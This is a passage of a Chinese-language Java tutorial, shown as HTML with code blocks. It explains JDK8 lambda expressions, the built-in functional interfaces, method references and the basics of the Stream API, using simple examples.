class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list =Arrays.asList(<span class="string">"aaa"</span>,<span class="string">"ggg"</span>,<span class="string">"ffff"</span>,<span class="string">"ccc"</span>);</span><br><span class="line">Collections.sort(list, (a,b)-&gt;b.compareTo(a));</span><br><span class="line"><span class="keyword">for</span> (String string : list) &#123;</span><br><span class="line">    System.out.println(string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>lambda表达式</strong> 使⽤场景(前提)：⼀个接⼝中只包含⼀个⽅法，则可以使⽤Lambda表达式，这样 的接⼝称之为“函数接⼝” 语法： (params) -&gt; expression</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第⼀部分为括号内⽤逗号分隔的形式参数，参数是函数式接⼝⾥⾯⽅法的参数；第⼆部分为⼀个箭</span><br><span class="line">头符号：-&gt;；第三部分为⽅法体，可以是表达式和代码块</span><br><span class="line"></span><br><span class="line">参数列表 ：</span><br><span class="line"> 括号中参数列表的数据类型可以省略不写</span><br><span class="line"> 括号中的参数只有⼀个，那么参数类型和()都可以省略不写</span><br><span class="line">⽅法体：</span><br><span class="line"> 如果&#123;&#125;中的代码只有⼀⾏，⽆论有返回值，可以省略&#123;&#125;，return，分号，要⼀起省略，其他如果需要再加上</span><br></pre></td></tr></table></figure><p>好处： <strong>Lambda 表达式的实现⽅式在本质是以匿名内部类的⽅式进⾏实现</strong>，重构现有臃肿代码，更⾼的开发效率，尤其是集合Collection操作的时候，后续会讲到</p><h2 id="JDK8之⾃定义函数式编程实战"><a href="#JDK8之⾃定义函数式编程实战" class="headerlink" title="JDK8之⾃定义函数式编程实战"></a>JDK8之⾃定义函数式编程实战</h2><p><strong>⾃定义lambda接⼝流程</strong> </p><ol><li>定义⼀个函数式接⼝ 需要标注此接⼝ @FunctionalInterface，否则万⼀团队成员在接⼝上加了其他⽅法则容易出故障</li><li>编写⼀个⽅法，输⼊需要操做的数据和接⼝ </li><li>在调⽤⽅法时传⼊数据 和 lambda 表达式，⽤来操作数据</li></ol><p><strong>需求，定义⼀个可以使⽤加减乘除的接⼝ 以前需要定义4个⽅法</strong></p><p>使⽤Lambda表达式后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义⼀个函数式接⼝ 需要标注此接⼝ @FunctionalInterface</span></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OperFunction</span>&lt;<span class="title">R</span>,<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">R <span class="title">operator</span><span class="params">(T t1, T t2)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(operator(<span class="number">20</span>, <span class="number">5</span>, (Integer x, Integer y) -&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> x * y;</span><br><span class="line">    &#125;));</span><br><span class="line">    <span class="comment">//在调⽤⽅法时传⼊数据 和 lambda 表达式，⽤来操作数据</span></span><br><span class="line">    System.out.println(operator(<span class="number">20</span>, <span class="number">5</span>, (x, y) -&gt; x + y));</span><br><span class="line">    System.out.println(operator(<span class="number">20</span>, <span class="number">5</span>, (x, y) -&gt; x - y));</span><br><span class="line">    System.out.println(operator(<span class="number">20</span>, <span class="number">5</span>, (x, y) -&gt; x / y));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//编写⼀个⽅法，输⼊需要操做的数据和接⼝ </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Integer <span class="title">operator</span><span class="params">(Integer x, Integer y, OperFunction&lt;Integer, Integer&gt; of)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> of.operator(x, y);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="JDK8-函数式编程"><a href="#JDK8-函数式编程" class="headerlink" title="JDK8 函数式编程"></a>JDK8 函数式编程</h1><h2 id="JDK8之函数式编程-Function"><a href="#JDK8之函数式编程-Function" class="headerlink" title="JDK8之函数式编程 Function"></a>JDK8之函数式编程 Function</h2><p>Lambda表达式必须先定义接⼝，创建相关⽅法之后才可使⽤，这样做⼗分不便，其实java8已经 内置了许多接⼝, 例如下⾯四个功能型接⼝，所以⼀般很少会由⽤户去定义新的函数式接⼝</p><p>Java8的最⼤特性就是函数式接⼝，所有标注了@FunctionalInterface注解的接⼝都是函数式接⼝</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java8 内置的四⼤核⼼函数式接⼝</span><br><span class="line">Consumer&lt;T&gt; : 消费型接⼝：有⼊参，⽆返回值</span><br><span class="line"> void accept(T t);</span><br><span class="line"> </span><br><span class="line">Supplier&lt;T&gt; : 供给型接⼝：⽆⼊参，有返回值</span><br><span class="line"> T get();</span><br><span class="line"> </span><br><span class="line">Function&lt;T, R&gt; : 函数型接⼝：有⼊参，有返回值</span><br><span class="line"> R apply(T t);</span><br><span class="line"> </span><br><span class="line">Predicate&lt;T&gt; : 断⾔型接⼝：有⼊参，有返回值，返回值类型确定是boolean</span><br><span class="line"> boolean test(T t);</span><br></pre></td></tr></table></figure><p><strong>Function接口</strong></p><ol><li>传⼊⼀个值经过函数的计算返回另⼀个值 </li><li>作⽤：将转换逻辑提取出来，解耦合</li><li>T：⼊参类型，R：出参类型 </li><li>调⽤⽅法：R apply(T t)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@param &lt;T&gt; the type of the input to the function</span></span><br><span class="line"><span class="comment">//@param &lt;R&gt; the type of the result of the function</span></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Function</span>&lt;<span class="title">T</span>, <span class="title">R</span>&gt; </span>&#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Applies this function to the given argument.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> t the function argument</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the function result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="function">R <span class="title">apply</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>不要看过于复杂，就是⼀个接⼝,下⾯是⾃定义实现</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FunctionObj</span> <span class="keyword">implements</span> <span class="title">Function</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">apply</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o+<span class="string">"经过apply处理拼接上了"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>常规使⽤</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输出⼊参的10倍</span></span><br><span class="line"><span class="comment">//其实就是看成实现类实现了接口的方法</span></span><br><span class="line">Function&lt;Integer, Integer&gt; func = p -&gt; p * <span class="number">100</span>;</span><br><span class="line">func.apply(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><h2 id="JDK8之函数式编程-BiFunction"><a href="#JDK8之函数式编程-BiFunction" class="headerlink" title="JDK8之函数式编程 BiFunction"></a>JDK8之函数式编程 BiFunction</h2><p><strong>BiFunction</strong> </p><p>Function只能接收⼀个参数，如果要传递两个参数,则⽤ BiFunction</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BiFunction</span>&lt;<span class="title">T</span>, <span class="title">U</span>, <span class="title">R</span>&gt; </span>&#123;</span><br><span class="line">     <span class="function">R <span class="title">apply</span><span class="params">(T t, U u)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需求：两个数的四则运算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(operator(<span class="number">10</span>,<span class="number">21</span>,(a,b)-&gt;a+b));</span><br><span class="line">    System.out.println(operator(<span class="number">10</span>,<span class="number">2</span>,(a,b)-&gt;a-b));</span><br><span class="line">    System.out.println(operator(<span class="number">8</span>,<span class="number">4</span>,(a,b)-&gt;a*b));</span><br><span class="line">    System.out.println(operator(<span class="number">10</span>,<span class="number">2</span>,(a,b)-&gt;a/b));</span><br><span class="line">&#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Integer <span class="title">operator</span><span class="params">(Integer a, Integer b, BiFunction&lt;Integer, Integer, Integer&gt; bf)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> bf.apply(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDK8之函数式编程-Consumer"><a href="#JDK8之函数式编程-Consumer" class="headerlink" title="JDK8之函数式编程 Consumer"></a>JDK8之函数式编程 Consumer</h2><p>Consumer 消费型接⼝：</p><ol><li>有⼊参，⽆返回值 </li><li>将 T 作为输⼊，不返回任何内容 </li><li>调⽤⽅法：void accept(T t);</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Consumer</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">accept</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⽤途： 因为没有出参，常⽤于打印、发送短信等消费动作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Consumer&lt;String&gt; consumer = obj-&gt;&#123;</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(<span class="string">"调⽤短信接⼝发送短信，或者打印⽇志"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// sendMsg("8888888",obj-&gt;&#123;</span></span><br><span class="line">    <span class="comment">// System.out.println(obj);</span></span><br><span class="line">    <span class="comment">// System.out.println("调⽤短信接⼝发送短信，或者打印⽇志");</span></span><br><span class="line">    <span class="comment">// &#125;);</span></span><br><span class="line">    sendMsg(<span class="string">"8888888"</span>,consumer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendMsg</span><span class="params">(String phone,Consumer&lt;String&gt; consumer)</span></span>&#123;</span><br><span class="line">    consumer.accept(phone);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>典型应⽤，集合的foreach</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"aaa"</span>,<span class="string">"bbb"</span>);</span><br><span class="line">list.forEach(obj-&gt;&#123;</span><br><span class="line"><span class="comment">//TODO</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="JDK8之函数式编程-Supplier"><a href="#JDK8之函数式编程-Supplier" class="headerlink" title="JDK8之函数式编程 Supplier"></a>JDK8之函数式编程 Supplier</h2><p><strong>Supplier: 供给型接⼝</strong></p><ol><li>⽆⼊参，有返回值 </li><li>T：出参类型；没有⼊参 </li><li>调⽤⽅法：T get();</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Supplier</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">T <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⽤途： 泛型⼀定和⽅法的返回值类型是⼀种类型，如果需要获得⼀个数据，并且不需要传⼊参数,可以使⽤Supplier接⼝，例如⽆参的⼯⼚⽅法，即⼯⼚设计模式创建对象，简单来说就是提供者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Student student = new Student();</span></span><br><span class="line">    Student student = newStudent();</span><br><span class="line">    System.out.println(student.getName());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Student <span class="title">newStudent</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Supplier&lt;Student&gt; supplier = ()-&gt; &#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">"默认名称"</span>);</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> supplier.get();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDK8之函数式编程-Predicate"><a href="#JDK8之函数式编程-Predicate" class="headerlink" title="JDK8之函数式编程 Predicate"></a>JDK8之函数式编程 Predicate</h2><p><strong>Predicate: 断⾔型接⼝</strong></p><ol><li>有⼊参，有返回值，返回值类型确定是boolean </li><li>T：⼊参类型；出参类型是Boolean </li><li>调⽤⽅法：boolean test(T t);</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Predicate</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">test</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⽤途： 接收⼀个参数，⽤于判断是否满⾜⼀定的条件，过滤数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; list = Arrays.asList(<span class="string">"awewrwe"</span>,<span class="string">"vdssdsd"</span>,<span class="string">"aoooo"</span>,<span class="string">"psdddsd"</span>);</span><br><span class="line">    List&lt;String&gt; results = filter(list,obj-&gt;obj.startsWith(<span class="string">"a"</span>));</span><br><span class="line">    System.out.println(results);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">filter</span><span class="params">(List&lt;String&gt; list, Predicate&lt;String&gt; predicate)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String str : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (predicate.test(str)) &#123;</span><br><span class="line">            results.add(str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDK8之⽅法与构造函数引⽤"><a href="#JDK8之⽅法与构造函数引⽤" class="headerlink" title="JDK8之⽅法与构造函数引⽤"></a>JDK8之⽅法与构造函数引⽤</h2><p>以前⽅法调⽤ <strong>对象.⽅法名</strong> 或者 <strong>类名.⽅法名</strong> </p><p><strong>jdk1.8提供了另外⼀种调⽤⽅式 ::</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">说明:⽅法引⽤是⼀种更简洁易懂的lambda表达式，操作符是双冒号::，⽤来直接访问类或者实例已经存在的⽅法或构造⽅法</span><br><span class="line"></span><br><span class="line">通过⽅法引⽤，可以将⽅法的引⽤赋值给⼀个变量</span><br><span class="line"></span><br><span class="line">语法：左边是容器（可以是类名，实例名），中间是&quot; :: &quot;，右边是相应的⽅法名</span><br><span class="line">静态⽅法，则是ClassName::methodName。如 Object ::equals</span><br><span class="line">实例⽅法，则是Instance::methodName</span><br><span class="line">构造函数，则是 类名::new;</span><br><span class="line"></span><br><span class="line">单个参数</span><br><span class="line">Function&lt;⼊参1, 返回类型&gt; func &#x3D; ⽅法引⽤</span><br><span class="line">应⽤ func.apply(⼊参);</span><br><span class="line"></span><br><span class="line">2个参数</span><br><span class="line">BiFunction&lt;⼊参1,⼊参2, 返回类型&gt; func &#x3D; ⽅法引⽤</span><br><span class="line">应⽤ func.apply(⼊参1,⼊参2);</span><br></pre></td></tr></table></figure><p><strong>实战</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestJdk8</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使⽤双冒号::来构造静态函数引⽤</span></span><br><span class="line">        Function&lt;String, Integer&gt; fun = Integer::parseInt;</span><br><span class="line">        Integer value = fun.apply(<span class="string">"1024"</span>);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">        <span class="comment">// 使⽤双冒号::来构造⾮静态函数引⽤</span></span><br><span class="line">        String content = <span class="string">"欢迎来到⼩滴课堂学习"</span>;</span><br><span class="line">        Function&lt;Integer, String&gt; func = content::substring;</span><br><span class="line">        String result = func.apply(<span class="number">1</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        <span class="comment">// 构造函数引⽤，多个参数</span></span><br><span class="line">        BiFunction&lt;String, Integer, User&gt; biFunction = User::<span class="keyword">new</span>;</span><br><span class="line">        User user1 = biFunction.apply(<span class="string">"⼩滴课堂"</span>, <span class="number">28</span>);</span><br><span class="line">        System.out.println(user1.toString());</span><br><span class="line">        <span class="comment">//构造函数引⽤，单个参数</span></span><br><span class="line">        Function&lt;String, User&gt; function = User::<span class="keyword">new</span>;</span><br><span class="line">        User user2 = function.apply(<span class="string">"⼩D"</span>);</span><br><span class="line">        System.out.println(user2.toString());</span><br><span class="line">        <span class="comment">// 函数引⽤也是⼀种函数式接⼝，可以将函数引⽤作为⽅法的参数</span></span><br><span class="line">        sayHello(String::toUpperCase, <span class="string">"xdclass.net"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> func 函数引⽤</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> param 对应的参数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(Function&lt;String, String&gt; func, String</span></span></span><br><span class="line"><span class="function"><span class="params">                                 param)</span> </span>&#123;</span><br><span class="line">        String result = func.apply(param);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username, Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="JDK8-集合框架"><a href="#JDK8-集合框架" class="headerlink" title="JDK8 集合框架"></a>JDK8 集合框架</h1><h2 id="JDK8之流Stream实战"><a href="#JDK8之流Stream实战" class="headerlink" title="JDK8之流Stream实战"></a>JDK8之流Stream实战</h2><p><strong>什么是stream？</strong></p><p>Stream 中⽂称为 “流”，通过将集合转换为这么⼀种叫做 “流”的元素队列，通过声明性⽅式，能够对集合中的每个元素进⾏⼀系列并⾏或串⾏的流⽔线操作，元素是特定类型的对象，所以元素集合看作⼀种流， 流在管道中传输， 且可以在管道的节点上进⾏处理， ⽐如 排序，聚合，过滤等操作</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210701114034.png" alt="image-20210701114024710"></p><p><strong>操作详情</strong></p><ol><li>数据元素便是原始集合，如List、Set、Map等</li><li>⽣成流，可以是串⾏流stream() 或者并⾏流 parallelStream() </li><li>中间操作，可以是 排序，聚合，过滤，转换等</li><li>终端操作，很多流操作本身就会返回⼀个流，所以多个操作可以直接连接起来，最后统⼀进⾏收集 </li><li>概览stream接⼝源码</li></ol><p><strong>快速上⼿</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"springboot教程"</span>,<span class="string">"微服务教程"</span>,<span class="string">"并发编程"</span>,<span class="string">"压⼒测试"</span>,<span class="string">"架构课程"</span>);</span><br><span class="line">List&lt;String&gt; resultList = list.stream().map(obj-&gt;<span class="string">"在⼩滴课堂学："</span>+obj).collect(Collectors.toList());</span><br><span class="line">System.out.println(resultList);</span><br></pre></td></tr></table></figure><h2 id="JDK8之流操作map和filter函数"><a href="#JDK8之流操作map和filter函数" class="headerlink" title="JDK8之流操作map和filter函数"></a>JDK8之流操作map和filter函数</h2><p><strong>map函数</strong> </p><p>将流中的每⼀个元素 T 映射为 R（类似类型转换），上堂课的例⼦就是，类似遍历集合，对集合的每个对象做处理</p><p>场景：转换对象，如javaweb开发中集合⾥⾯的DO对象转换为DTO对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; list = Arrays.asList(<span class="keyword">new</span> User(<span class="number">1</span>,<span class="string">"⼩东"</span>,<span class="string">"123"</span>), <span class="keyword">new</span> User(<span class="number">21</span>,<span class="string">"jack"</span>,<span class="string">"rawer"</span>), <span class="keyword">new</span> User(<span class="number">155</span>,<span class="string">"tom"</span>,<span class="string">"sadfsdfsdfsd"</span>), <span class="keyword">new</span> User(<span class="number">231</span>,<span class="string">"marry"</span>,<span class="string">"234324"</span>), <span class="keyword">new</span> User(<span class="number">100</span>,<span class="string">"⼩D"</span>,<span class="string">"122223"</span>));</span><br><span class="line">List&lt;UserDTO&gt; userDTOList = list.stream().map(obj-&gt;&#123;</span><br><span class="line">    UserDTO userDTO = <span class="keyword">new</span> UserDTO(obj.getId(),obj.getName());</span><br><span class="line">    <span class="keyword">return</span> userDTO;</span><br><span class="line">&#125;).collect(Collectors.toList());</span><br><span class="line">System.out.println(userDTOList);</span><br></pre></td></tr></table></figure><p><strong>filter函数</strong></p><p>⽤于通过设置的条件过滤出元素 